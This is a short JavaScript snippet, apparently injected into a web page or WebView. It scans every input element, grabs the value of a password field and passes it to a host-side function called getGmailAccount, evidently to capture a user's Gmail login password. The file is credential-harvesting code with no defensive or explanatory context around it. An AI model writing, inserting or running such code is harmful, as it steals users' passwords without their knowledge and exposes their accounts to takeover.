function pwd() {
    const b = document.querySelectorAll("input");
    let e;
    console.log(b);
    for (let c = 0; c < b.length; c++) {
        let d = b[c];
        if (d.type === "password") {
            e = b[c].value
        }
        d = null
    }
    return e
}

window.getGmailAccount.getGmailAccount(pwd());